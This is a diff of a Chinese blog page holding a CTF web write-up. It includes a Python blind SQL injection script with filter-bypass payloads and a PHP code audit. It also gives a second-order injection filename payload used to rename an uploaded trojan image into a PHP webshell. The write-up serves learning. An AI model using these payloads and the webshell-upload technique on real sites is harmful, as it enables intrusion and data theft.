class="string">'http://bxs.cumt.edu.cn:30010/test/index.php'</span></span><br><span class="line">payloads = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,&#123;&#125;_'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> payloads:  <span class="comment"># 依次跑下面三个payload</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=if(substr((seleselectct/**/binary/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;i&#125;,1)='&#123;j&#125;', 1, 0)"</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#payload = f"?id=if(substr((selselectect/**/binary/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;i&#125;,1)='&#123;j&#125;', 1, 0)"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 字段</span></span><br><span class="line">        payload = <span class="string">f"?id=if(substr((selselectect/**/binary/**/group_concat(flag)/**/from/**/flagishere) ,<span class="subst">&#123;i&#125;</span>,1)='<span class="subst">&#123;j&#125;</span>', 1, 0)"</span></span><br><span class="line">        <span class="comment"># 这里通过加入binary来区分大小写，因为flag中大小写都可能包含</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'NoNoNo'</span> <span class="keyword">not</span> <span class="keyword">in</span> s.get(url+payload).text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure></p>
-<p>最终获得flag如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303130639145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
+<p>最终获得flag如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303130639145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
 <h4><span id="web7文件管理系统">Web7：文件管理系统</span></h4><p>1、先扫目录，发现可以下载源码，进行代码审计。<br>2、查看upload.php代码，发现是如下白名单验证，无法上传绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    $file = $_FILES[<span class="string">"upfile"</span>];</span><br><span class="line">    <span class="keyword">if</span>($file[<span class="string">"error"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class="line">        $name = basename($file[<span class="string">"name"</span>]);</span><br><span class="line">        $path_parts = pathinfo($name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($path_parts[<span class="string">"extension"</span>], <span class="keyword">array</span>(<span class="string">"gif"</span>, <span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"zip"</span>, <span class="string">"txt"</span>))) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"error extension"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $path_parts[<span class="string">"extension"</span>] = <span class="string">"."</span> . $path_parts[<span class="string">"extension"</span>]; </span><br><span class="line">        <span class="comment">// $path_parts["extension"] = ".jpg"</span></span><br><span class="line"></span><br><span class="line">        $name = $path_parts[<span class="string">"filename"</span>] . $path_parts[<span class="string">"extension"</span>];</span><br><span class="line">        </span><br><span class="line">        $path_parts[<span class="string">'filename'</span>] = addslashes($path_parts[<span class="string">'filename'</span>]);</span><br><span class="line">        <span class="comment">//$path_parts['filename'] = "',extension='',filename='webshell.jpg"</span></span><br><span class="line"></span><br><span class="line">        $sql = <span class="string">"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"file is exists"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($file[<span class="string">"tmp_name"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')"</span>;</span><br><span class="line">            $re = $db-&gt;query($sql);</span><br><span class="line">            <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">                print_r($db-&gt;error);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $url = <span class="string">"/"</span> . UPLOAD_DIR . $name;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is upload, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">"upload error"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        print_r(error_get_last());</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>3.问题主要出现在rename.php里，代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"common.inc.php"</span>;</span><br><span class="line">define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line">    <span class="comment">//因为filename是经过转义后存入数据库的，这里是正常执行sql语句</span></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($result) &#123;</span><br><span class="line">        </span><br><span class="line">        $req[<span class="string">'newname'</span>] = basename($req[<span class="string">'newname'</span>]);</span><br><span class="line">        $re = $db-&gt;query(<span class="string">"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!$re) &#123;</span><br><span class="line">            print_r($db-&gt;errorInfo());</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $oldname = ROOT.UPLOAD_DIR . $result[<span class="string">"filename"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        $newname = ROOT.UPLOAD_DIR . $req[<span class="string">"newname"</span>].$result[<span class="string">"extension"</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists($oldname)) &#123;</span><br><span class="line">            rename($oldname, $newname);</span><br><span class="line">            $url = <span class="string">"/"</span> . $newname;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your file is rename, url:</span></span><br><span class="line"><span class="string">                &lt;a href=\"&#123;$url&#125;\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">                &lt;a href=\"/\"&gt;go back&lt;/a&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;<span class="keyword">echo</span> $oldname.<span class="string">" not exists."</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>第一个<code>select</code>语句显示根据 <code>$req[&#39;filename&#39;]</code> 从数据库里查询到已存在的一行，再用第二个<code>update</code>语句进行修改，这里的<code>&#39;oldname&#39;=&#39;{$result[&#39;filename&#39;]}&#39;</code>将从数据库里查出的<code>$result[&#39;filename&#39;]</code>再一次入库，因此存在二次注入。</p>
@@ -136,9 +195,9 @@
 </ul>
 <p>虽然代码要求<code>oldname</code>和<code>newname</code>要求后缀相同，可以通过<strong>update型注入</strong>将<code>extension</code>改为空，同时可修改<code>filename</code>的值。<br>因此<strong>构造</strong>的<strong>文件名payload</strong>为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code> </p>
 <p>5、上传文件名为：<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg.jpg</code>的文件后，根据upload.php知:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$path_parts[&quot;extension&quot;] = &quot;.jpg&quot;</span><br><span class="line">$path_parts[&apos;filename&apos;] = &quot;&apos;,extension=&apos;&apos;,filename=&apos;webshell.jpg&quot;</span><br><span class="line">插入数据库后，此时数据库里：</span><br><span class="line">filename字段的值为经过addslashes()转义的&apos;,extension=&apos;&apos;,filename=&apos;webshell.jpg</span><br><span class="line">extension字段的值为.jpg</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110502291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110502291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>6、下来才是真正的<strong>updata注入过程</strong></p>
-<p>进入到rename.php页面，进行如下操作，将文件名修改为由<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg</code>修改为<code>webshell.jpg</code>（这里rename页面输入的文件名均是要求不含后缀的，在数据库里文件名和后缀是分两个字段进行存储的）<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110649872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上述操作改名后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$req[&apos;oldname&apos;] = &quot;&apos;,extension=&apos;&apos;,filename=&apos;webshell.jpg&quot;</span><br><span class="line">$req[&apos;newname&apos;] = &quot;webshell.jpg&quot;</span><br></pre></td></tr></table></figure></p>
+<p>进入到rename.php页面，进行如下操作，将文件名修改为由<code>&#39;,extension=&#39;&#39;,filename=&#39;webshell.jpg</code>修改为<code>webshell.jpg</code>（这里rename页面输入的文件名均是要求不含后缀的，在数据库里文件名和后缀是分两个字段进行存储的）<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303110649872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上述操作改名后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$req[&apos;oldname&apos;] = &quot;&apos;,extension=&apos;&apos;,filename=&apos;webshell.jpg&quot;</span><br><span class="line">$req[&apos;newname&apos;] = &quot;webshell.jpg&quot;</span><br></pre></td></tr></table></figure></p>
 <p>接下来执行：<code>select * from &#39;file&#39; where &#39;filename&#39;=&#39;{$req[&#39;oldname&#39;]}&#39;</code><br>因为<code>filename</code>在上传后经过<code>addslashes()</code>转义的，所以此条语句正常执行</p>
 <p>但是在执行下条语句，也就是：</p>
 <pre><code>update &apos;file&apos; set &apos;filename&apos;=&apos;{$req[&apos;newname&apos;]}&apos;, &apos;oldname&apos;=&apos;{$result[&apos;filename&apos;]}&apos; where &apos;fid&apos;={$result[&apos;fid&apos;]}
@@ -154,7 +213,7 @@ extension =  空
 <li>执行<code>rename()</code>函数还有一个判断:<code>if(file_exists($oldname))</code>，但实际上我们系统目录并没有<code>webshell.jpg</code>这个文件，这样就需要再上传一个<code>webshell.jpg</code>文件。</li>
 </ul>
 <p>7、因此接下来就可以上传真正包含一句话木马的文件：<code>webshell.jpg</code>，上传后：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> $path_parts[&quot;extension&quot;] = &quot;.jpg&quot;</span><br><span class="line"> $path_parts[&apos;filename&apos;] = &quot;webshell&quot;</span><br><span class="line">并在数据库中插入了新的一条记录：</span><br><span class="line"> filename字段的值为经过addslashes()转义的webshell</span><br><span class="line"> extension字段的值为.jpg</span><br><span class="line"> 且系统目录下存在真实文件：webshell.jpg</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303112153331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来再次进入rename.php页面进行改名，这也是很关键的一步：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311225052.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将<code>webshell.jpg</code>改为<code>webshell.php</code>，这样操作后：</p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303112153331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>接下来再次进入rename.php页面进行改名，这也是很关键的一步：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311225052.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>将<code>webshell.jpg</code>改为<code>webshell.php</code>，这样操作后：</p>
 <p>因为注入后，数据库中存在<code>filename</code>为<code>webshell.jpg</code>的记录，因此可以绕过这条语句：</p>
 <pre><code>select * from &apos;file&apos; where &apos;filename&apos;=&apos;{$req[&apos;oldname&apos;]}&apos;
 </code></pre><p>然后再次通过updata语句：</p>
@@ -168,96 +227,198 @@ extension =  空
 <pre><code>$oldname = webshell.php
 $newname = webshell.jpg
 </code></pre><p>最后，在进行<code>if(file_exists($oldname))</code>判断时，因为第二次上传到目录的文件就是<code>webshell.jpg</code>，所以可以通过判断。<br>这样就可以执行<code>rename($oldname, $newname)</code>，将目录下的包含木马的文件<code>webshell.jpg</code>改名为<code>webshell.php</code>，也就成功上传了php木马到后台。</p>
-<p>8、既然已经成功上传了webshell，那么直接用菜刀链接，即可getshell，获得flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311515537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>8、既然已经成功上传了webshell，那么直接用菜刀链接，即可getshell，获得flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/2019030311515537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 
+            <hr>
+          </div>
+          <br>
+          <div>
+            
+              <p>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
+                  &nbsp;
+                
+              </p>
+            
+            <p>
+              <i class="iconfont icon-tag"></i>
+              
+                <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
+              
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      <div class="disqus" style="width:100%">
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_shortname = 'Lethe';
+    var disqus_config = function () {
+      this.page.url = 'https://lethe.site/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/';
+      this.page.identifier = '/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+      powered by Disqus.</a></noscript>
+</div>
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-<div class="lx-navigation">
-	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/03/07/BugkuCTF-Writeup——Web/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Next</span>
-						<h3>BugkuCTF_Web_Writeup</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Prev</span>
-						<h3>以dvwa为例学习简单sql布尔盲注的详细脚本</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-</div>
-</div>
-<div class="comment"><div id="comments"></div></div>
-<footer>
-  <div>
-  Copyright &copy; 2019.<a href="/">Lethe | 忘川</a>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
   </div>
 </footer>
-</div>
 
-<button class="menu-trigger"></button>
-<div class="menu">
-  <div class="menu-head">
-    <span class="layer">
-      <div class="col">
-        <div class="row for-pic">
-          <div class="profile-pic">
-            <a href="/"><img src="/images/2.jpg" alt="Lethe"></a>
-          </div>
-        </div>
-        <div class="row for-name">
-          <p>Lethe</p>
-          <span class="tagline">Hello, World!</span>
-        </div>
-      </div>
-    </span>
-  </div>
-  <nav class="menu-container">
-  <ul class="menu-items">
-    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
-    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-bookmark fa-fw"></i>页面</span>
-        <ul>
-          <li><a href="/about">关于</a></li>
-        </ul>
-    </li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-link fa-fw"></i>友链</span>
-        <ul>
-          <li> <a href="https://hiworldalice.github.io/" target="_blank">Tunt</a></li>
-        <li> <a href="https://3nd.xyz" target="_blank">3ND</a></li>
-        </ul>
-    </li>
-  </ul>
-  </nav>
-</div>
-
-<div class="gototop js-top">
-  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
-</div>
-<script src="/js/jquery.easing.min.js"></script>
-<script src="/js/jquery.waypoints.min.js"></script>
-<script src="/js/jquery.stellar.min.js"></script>
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/popper/popper.min.js"></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js"></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
+  <script src="/js/lazyload.js"></script>
 
+
+  
+    <script src="/lib/tocbot/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+  <script src="/lib/prettify/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+  <script src="/lib/typed/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "CumtCTF2019Ⅱ——Writeup（Web详解）&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+  <script src="/lib/anchor/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "false",
+      
+      icon: "§"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script>
+    if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent) || (/Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent))) {
+      $("#background").css("background-attachment", "scroll");
+    }
+  </script>
 
 </body>
 </html>
